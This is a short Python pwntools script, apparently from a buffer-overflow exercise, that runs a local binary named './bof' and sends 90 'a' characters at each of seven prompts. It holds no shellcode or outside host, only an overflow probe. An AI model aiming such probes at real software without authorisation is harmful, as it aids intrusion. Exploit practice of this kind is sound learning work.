#!/usr/bin/python

from pwn import *

p = process('./bof')
i = 1
while (i<8):
    output=p.readuntil(':')
    print(output)
    p.writeline(b'a'*90)
    i+=1
print('[+]Output: '+str(p.clean(3)))
p.close()
